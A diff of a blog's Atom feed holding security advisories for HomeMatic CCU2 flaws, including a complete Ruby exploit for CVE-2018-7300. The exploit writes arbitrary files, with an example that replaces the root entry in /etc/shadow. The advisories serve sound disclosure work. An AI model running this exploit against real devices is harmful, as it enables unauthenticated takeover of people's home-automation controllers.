+			&lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;formzeile&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+			&lt;span class=&quot;nt&quot;&gt;&amp;lt;label&amp;gt;&lt;/span&gt;Passwort&lt;span class=&quot;nt&quot;&gt;&amp;lt;/label&amp;gt;&lt;/span&gt;
+			&lt;span class=&quot;nt&quot;&gt;&amp;lt;span&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;textfeld&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;password&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;password&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;password&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;/span&amp;gt;&lt;/span&gt;
+			&lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
+		&lt;span class=&quot;nt&quot;&gt;&amp;lt;/fieldset&amp;gt;&lt;/span&gt;
+
+...[SNIP]...
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h1 id=&quot;cve&quot;&gt;CVE&lt;/h1&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-18692&quot;&gt;CVE-2018-18692&lt;/a&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;cvssv3-base-score&quot;&gt;CVSSv3 Base Score&lt;/h1&gt;
+
+&lt;p&gt;CVSS Base Score: &lt;strong&gt;5.5&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;CVSS:3.0/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N&lt;/p&gt;
+
+&lt;h1 id=&quot;credit&quot;&gt;Credit&lt;/h1&gt;
+
+&lt;p&gt;Pascal Keul of &lt;a href=&quot;https://www.sva.de&quot;&gt;SVA System Vertrieb Alexander GmbH&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Patrick Muench of &lt;a href=&quot;https://www.sva.de&quot;&gt;SVA System Vertrieb Alexander GmbH&lt;/a&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;disclaimer&quot;&gt;Disclaimer&lt;/h1&gt;
+
+&lt;p&gt;The information provided is released “as is” without warranty of any kind. The publisher disclaims all warranties, either express or implied, including all warranties of merchantability. No responsibility is taken for the correctness of this information. In no event shall the publisher be liable for any damages whatsoever including direct, indirect, incidental, consequential, loss of business profits or special damages, even if the publisher has been advised of the possibility of such damages.&lt;/p&gt;
+
+&lt;p&gt;The contents of this advisory are copyright (c) 2018 SVA System Vertrieb Alexander GmbH and may be distributed freely provided that no fee is charged for this distribution and proper credit is given.&lt;/p&gt;
+</content>
+ </entry>
+ 
+ <entry>
    <title>CVE-2018-7298: Downloading Firmware via Plain HTTP in HomeMatic CCU2</title>
-   <link href="http://atomic111.github.io/article/homematic-ccu2-firmware-via-plain-http"/>
-   <updated>2018-02-21T19:40:00+00:00</updated>
-   <id>http://atomic111.github.io/article/homematic-ccu2-firmware-via-plain-http</id>
+   <link href="http://localhost:4000/article/homematic-ccu2-firmware-via-plain-http"/>
+   <updated>2018-02-21T20:40:00+01:00</updated>
+   <id>http://localhost:4000/article/homematic-ccu2-firmware-via-plain-http</id>
    <content type="html">&lt;h1 id=&quot;background&quot;&gt;Background&lt;/h1&gt;
 
 &lt;p&gt;HomeMatic is a home automation system consisting of various components for automating several parts of a building, including different sensors and actuators. The HomeMatic CCU2 is a central control unit, which is responsible for integrating these components with each other.&lt;/p&gt;
@@ -27,19 +365,18 @@
 
 &lt;h1 id=&quot;issue-description&quot;&gt;Issue Description&lt;/h1&gt;
 
-&lt;p&gt;While analyzing the CCU2 software, it was found that the system’s crontab file contains an entry for invoking the script &lt;code&gt;/usr/local/etc/config/addons/mh/loopupd.sh&lt;/code&gt; on a regular basis. This script contains the following code:&lt;/p&gt;
+&lt;p&gt;While analyzing the CCU2 software, it was found that the system’s crontab file contains an entry for invoking the script &lt;code class=&quot;highlighter-rouge&quot;&gt;/usr/local/etc/config/addons/mh/loopupd.sh&lt;/code&gt; on a regular basis. This script contains the following code:&lt;/p&gt;
 
-&lt;p&gt;```
-ADDONDIR=/usr/local/etc/config/addons/mh&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ADDONDIR=/usr/local/etc/config/addons/mh
 
-&lt;h1 id=&quot;altes-schluessel-paket-loeschen&quot;&gt;altes Schluessel-Paket loeschen&lt;/h1&gt;
-&lt;p&gt;v1=&lt;code&gt;rm $ADDONDIR/vpnkey_ccu2.tar.gz&lt;/code&gt;
-v1b=&lt;code&gt;rm $ADDONDIR/newver&lt;/code&gt;
+#altes Schluessel-Paket loeschen
+v1=`rm $ADDONDIR/vpnkey_ccu2.tar.gz`
+v1b=`rm $ADDONDIR/newver`
 #
 #das Paket des Benutzers herunter laden
-v2=&lt;code&gt;/usr/bin/wget -O $ADDONDIR/newver &#39;http://www.meine-homematic.de/getverv2.php?id=29294&amp;amp;key=s35m89s3k73e19y7&#39; -q&lt;/code&gt;
+v2=`/usr/bin/wget -O $ADDONDIR/newver 'http://www.meine-homematic.de/getverv2.php?id=29294&amp;amp;key=s35m89s3k73e19y7' -q`
 #
-```&lt;/p&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;It can be observed that software update packages are downloaded via the HTTP protocol, which does not provide any cryptographic protection of the downloaded contents. An attacker with a privileged network position (which could be obtained via DNS spoofing or other approaches) can exploit this issue in order to provide arbitrary malicious firmware updates to the CCU2. This can result in a full system compromise.&lt;/p&gt;
 
@@ -69,9 +406,9 @@ v2=&lt;code&gt;/usr/bin/wget -O $ADDONDIR/newver &#39;http://www.meine-homematic
  
  <entry>
    <title>CVE-2018-7300: Arbitrary File Upload / Remote Code Execution in HomeMatic CCU2</title>
-   <link href="http://atomic111.github.io/article/homematic-ccu2-filewrite"/>
-   <updated>2018-02-21T18:25:00+00:00</updated>
-   <id>http://atomic111.github.io/article/homematic-ccu2-filewrite</id>
+   <link href="http://localhost:4000/article/homematic-ccu2-filewrite"/>
+   <updated>2018-02-21T19:25:00+01:00</updated>
+   <id>http://localhost:4000/article/homematic-ccu2-filewrite</id>
    <content type="html">&lt;h1 id=&quot;background&quot;&gt;Background&lt;/h1&gt;
 
 &lt;p&gt;HomeMatic is a home automation system consisting of various components for automating several parts of a building, including different sensors and actuators. The HomeMatic CCU2 is a central control unit, which is responsible for integrating these components with each other.&lt;/p&gt;
@@ -86,98 +423,97 @@ v2=&lt;code&gt;/usr/bin/wget -O $ADDONDIR/newver &#39;http://www.meine-homematic
 
 &lt;p&gt;The system provides a JSON API, which exposes various methods. While some methods require the connecting user to be authenticated, a number of methods can also be used anonymously.&lt;/p&gt;
 
-&lt;p&gt;A code review of the file &lt;code&gt;api/methods/user/setlanguage.tcl&lt;/code&gt; revealed that the User.setLanguage method, which can be used without authentication, is prone to a Directory Traversal vulnerability. Please consider the following excerpt from the affected code:&lt;/p&gt;
+&lt;p&gt;A code review of the file &lt;code class=&quot;highlighter-rouge&quot;&gt;api/methods/user/setlanguage.tcl&lt;/code&gt; revealed that the User.setLanguage method, which can be used without authentication, is prone to a Directory Traversal vulnerability. Please consider the following excerpt from the affected code:&lt;/p&gt;
 
-&lt;p&gt;&lt;code&gt;
-exec echo $args(userLang)&amp;gt;/etc/config/userprofiles/$args(userName).lang
-&lt;/code&gt;&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;exec echo $args(userLang)&amp;gt;/etc/config/userprofiles/$args(userName).lang
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;This means that an attacker can create or overwrite arbitrary files on the CCU2’s filesystem. Please note that full control over the target file name can be obtained by injecting a null byte into the userName argument in order to prevent the string “.lang” from being appended to the resulting file name. The file contents can be directly controlled via the userLang argument.&lt;/p&gt;
 
 &lt;h1 id=&quot;proof-of-concept&quot;&gt;Proof-of-Concept&lt;/h1&gt;
 
-&lt;pre&gt;&lt;code class=&quot;language-ruby&quot;&gt;#!/usr/bin/ruby
+&lt;div class=&quot;language-ruby highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/ruby&lt;/span&gt;
 
-# Exploit Title: Homematic CCU2 Arbitrary File Write
-# Date: 28-03-18
-# Exploit Author: Patrick Muench (SVA System Vertrieb Alexander GmbH), Gregor Kopf (Secfault Security GmbH)
-# Vendor Homepage: http://www.eq-3.de
-# Software Link: http://www.eq-3.de/service/downloads.html?id=268
-# Version: 2.29.23
-# CVE : 2018-7300
+&lt;span class=&quot;c1&quot;&gt;# Exploit Title: Homematic CCU2 Arbitrary File Write&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;# Date: 28-03-18&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;# Exploit Author: Patrick Muench (SVA System Vertrieb Alexander GmbH), Gregor Kopf (Secfault Security GmbH)&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;# Vendor Homepage: http://www.eq-3.de&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;# Software Link: http://www.eq-3.de/service/downloads.html?id=268&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;# Version: 2.29.23&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;# CVE : 2018-7300&lt;/span&gt;
 
-# Description: http://atomic111.github.io/article/homematic-ccu2-filewrite
+&lt;span class=&quot;c1&quot;&gt;# Description: http://atomic111.github.io/article/homematic-ccu2-filewrite&lt;/span&gt;
 
-require &#39;net/http&#39;
-require &#39;net/https&#39;
-require &#39;uri&#39;
-require &#39;json&#39;
+&lt;span class=&quot;nb&quot;&gt;require&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'net/http'&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;require&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'net/https'&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;require&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'uri'&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;require&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'json'&lt;/span&gt;
 
-unless ARGV.length == 3
-  STDOUT.puts &amp;lt;&amp;lt;-EOF
+&lt;span class=&quot;k&quot;&gt;unless&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;ARGV&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;length&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;
+  &lt;span class=&quot;no&quot;&gt;STDOUT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;puts&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;-&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;EOF&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;
 Please provide url
 
 Usage:
   write_files.rb &amp;lt;ip.adress&amp;gt; &amp;lt;file path&amp;gt; &amp;lt;content of the file&amp;gt;
 
 Example:
-  write_files.rb https://192.168.1.1 &#39;/etc/shadow&#39; &#39;root:$1$DsoAgNYx$BSSQ9cLv0DLLknpqztgdd/:19087:0:99999:7:::&#39;
+  write_files.rb https://192.168.1.1 '/etc/shadow' 'root:$1$DsoAgNYx$BSSQ9cLv0DLLknpqztgdd/:19087:0:99999:7:::'
 
   or
 
-  write_files.rb http://192.168.1.1 &#39;/etc/shadow&#39; &#39;root:$1$DsoAgNYx$BSSQ9cLv0DLLknpqztgdd/:19087:0:99999:7:::&#39;
+  write_files.rb http://192.168.1.1 '/etc/shadow' 'root:$1$DsoAgNYx$BSSQ9cLv0DLLknpqztgdd/:19087:0:99999:7:::'
 
-EOF
-  exit
-end
+&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;EOF&lt;/span&gt;
+  &lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
 
-# The first argument specifies the URL and if http or https is used
-url = ARGV[0] + &quot;/api/homematic.cgi&quot;
+&lt;span class=&quot;c1&quot;&gt;# The first argument specifies the URL and if http or https is used&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;ARGV&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;/api/homematic.cgi&quot;&lt;/span&gt;
 
-# The second argument specifies the file into which the content should be written
-homematic_file_path = ARGV[1]
+&lt;span class=&quot;c1&quot;&gt;# The second argument specifies the file into which the content should be written&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;homematic_file_path&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;ARGV&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
 
-# The third argument specifies the content of the file
-homematic_file_content = ARGV[2]
+&lt;span class=&quot;c1&quot;&gt;# The third argument specifies the content of the file&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;homematic_file_content&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;ARGV&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
 
-# define the json body for the attack
-body = {
-        &quot;version&quot;: &quot;1.1&quot;,
-        &quot;method&quot;: &quot;User.setLanguage&quot;,
-        &quot;params&quot;: {
-                    &quot;userName&quot;: &quot;file path&quot;,
-                    &quot;userLang&quot;: &quot;file content&quot;
-                  }
-        }.to_hash
+&lt;span class=&quot;c1&quot;&gt;# define the json body for the attack&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;body&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;s2&quot;&gt;&quot;version&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;1.1&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+        &lt;span class=&quot;s2&quot;&gt;&quot;method&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;User.setLanguage&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+        &lt;span class=&quot;s2&quot;&gt;&quot;params&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+                    &lt;span class=&quot;s2&quot;&gt;&quot;userName&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;file path&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+                    &lt;span class=&quot;s2&quot;&gt;&quot;userLang&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;file content&quot;&lt;/span&gt;
+                  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+        &lt;span class=&quot;p&quot;&gt;}.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;to_hash&lt;/span&gt;
 
-# define the traversal with the file you want to write
-body[:params][:userName] = &quot;../../../../../../../..&quot; + homematic_file_path + &quot;\u0000&quot;
+&lt;span class=&quot;c1&quot;&gt;# define the traversal with the file you want to write&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;body&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:params&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;][&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:userName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;../../../../../../../..&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;homematic_file_path&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\u&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;0000&quot;&lt;/span&gt;
 
-# define the content
-body[:params][:userLang] = homematic_file_content
+&lt;span class=&quot;c1&quot;&gt;# define the content&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;body&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:params&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;][&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:userLang&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;homematic_file_content&lt;/span&gt;
 
-# split the uri to access it in a easier way
-uri = URI.parse(url)
+&lt;span class=&quot;c1&quot;&gt;# split the uri to access it in a easier way&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;uri&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;URI&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;parse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 
-# define target connection, disabling certificate verification
-Net::HTTP.start(uri.host, uri.port, :use_ssl =&amp;gt; uri.scheme == &#39;https&#39;, :verify_mode =&amp;gt; OpenSSL::SSL::VERIFY_NONE) do |http|
+&lt;span class=&quot;c1&quot;&gt;# define target connection, disabling certificate verification&lt;/span&gt;
+&lt;span class=&quot;no&quot;&gt;Net&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;HTTP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;start&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;uri&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;host&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;uri&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;:use_ssl&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;uri&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;scheme&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'https'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;:verify_mode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;OpenSSL&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;SSL&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;VERIFY_NONE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;http&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
 
-  # define post request
-  request = Net::HTTP::Post.new(uri.request_uri)
+  &lt;span class=&quot;c1&quot;&gt;# define post request&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;request&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;Net&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;HTTP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;Post&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;uri&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;request_uri&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 
-  # define the content type of the http request
-  request.content_type = &#39;application/json&#39;
+  &lt;span class=&quot;c1&quot;&gt;# define the content type of the http request&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;content_type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'application/json'&lt;/span&gt;
 
-  # define the request body
-  request.body = body.to_json
+  &lt;span class=&quot;c1&quot;&gt;# define the request body&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;body&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;body&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;to_json&lt;/span&gt;
 
-  # send the request to the homematic ccu2
-  response = http.request(request)
+  &lt;span class=&quot;c1&quot;&gt;# send the request to the homematic ccu2&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;response&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;http&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 
-  # print response message code and status to cli
-  puts &#39;Response code: &#39; + response.code + &#39; &#39; + response.message
-end
-&lt;/code&gt;&lt;/pre&gt;
+  &lt;span class=&quot;c1&quot;&gt;# print response message code and status to cli&lt;/span&gt;
+  &lt;span class=&quot;nb&quot;&gt;puts&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'Response code: '&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;code&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;' '&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;message&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;h1 id=&quot;cve&quot;&gt;CVE&lt;/h1&gt;
 
@@ -205,9 +541,9 @@ end
  
  <entry>
    <title>CVE-2018-7299: Untrusted Addon Installation / Remote Code Execution in HomeMatic CCU2</title>
-   <link href="http://atomic111.github.io/article/homematic-ccu2-untrusted_addon"/>
-   <updated>2018-02-21T17:00:00+00:00</updated>
-   <id>http://atomic111.github.io/article/homematic-ccu2-untrusted_addon</id>
+   <link href="http://localhost:4000/article/homematic-ccu2-untrusted_addon"/>
+   <updated>2018-02-21T18:00:00+01:00</updated>
+   <id>http://localhost:4000/article/homematic-ccu2-untrusted_addon</id>
    <content type="html">&lt;h1 id=&quot;background&quot;&gt;Background&lt;/h1&gt;
 
 &lt;p&gt;HomeMatic is a home automation system consisting of various components for automating several parts of a building, including different sensors and actuators. The HomeMatic CCU2 is a central control unit, which is responsible for integrating these components with each other.&lt;/p&gt;
@@ -222,7 +558,7 @@ end
 
 &lt;p&gt;An authenticated user can upload addon packages, which contain an update_script file. This update_script file will be executed during the addon installation process. This means that an attacker can create or overwrite arbitrary files or install malicious software.&lt;/p&gt;
 
-&lt;p&gt;This vulnerability can be exploited in order to execute arbitrary code on the system. An attacker can for instance overwrite the &lt;code&gt;/usr/local/crontabs/root&lt;/code&gt; crontab in order to reach this goal.&lt;/p&gt;
+&lt;p&gt;This vulnerability can be exploited in order to execute arbitrary code on the system. An attacker can for instance overwrite the &lt;code class=&quot;highlighter-rouge&quot;&gt;/usr/local/crontabs/root&lt;/code&gt; crontab in order to reach this goal.&lt;/p&gt;
 
 &lt;p&gt;This can in particular be problematic if users install untrusted addons from remote sources. It might be advisable to introduce a signing scheme for trusted addons and to warn the user in case they install untrusted or unsigned addons, which could contain malicious code.&lt;/p&gt;
 
@@ -260,9 +596,9 @@ end
  
  <entry>
    <title>CVE-2018-7297: Remote Code Execution in HomeMatic CCU2</title>
-   <link href="http://atomic111.github.io/article/homematic-ccu2-remote-code-execution"/>
-   <updated>2018-02-21T17:00:00+00:00</updated>
-   <id>http://atomic111.github.io/article/homematic-ccu2-remote-code-execution</id>
+   <link href="http://localhost:4000/article/homematic-ccu2-remote-code-execution"/>
+   <updated>2018-02-21T18:00:00+01:00</updated>
+   <id>http://localhost:4000/article/homematic-ccu2-remote-code-execution</id>
    <content type="html">&lt;h1 id=&quot;background&quot;&gt;Background&lt;/h1&gt;
 
 &lt;p&gt;HomeMatic is a home automation system consisting of various components for automating several parts of a building, including different sensors and actuators. The HomeMatic CCU2 is a central control unit, which is responsible for integrating these components with each other.&lt;/p&gt;
@@ -275,37 +611,36 @@ end
 
 &lt;p&gt;While analyzing the implementation of the CCU2’s web interface, a remote code execution vulnerability has been identified, which can be exploited in order to read and write arbitrary files to the CCU2’s filesystem. This vulnerability can be exploited by unauthenticated attackers with access to the web interface.&lt;/p&gt;
 
-&lt;p&gt;The TCL script interpreter is not secured by any session handling and executes all TCL scripts sent via POST requests to &lt;code&gt;/Text.exe&lt;/code&gt; on port 80 or 8181 of the system.&lt;/p&gt;
+&lt;p&gt;The TCL script interpreter is not secured by any session handling and executes all TCL scripts sent via POST requests to &lt;code class=&quot;highlighter-rouge&quot;&gt;/Text.exe&lt;/code&gt; on port 80 or 8181 of the system.&lt;/p&gt;
 
 &lt;p&gt;TCL script example:&lt;/p&gt;
 
-&lt;p&gt;&lt;code&gt;
-string stdout;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;string stdout;
 string stderr;
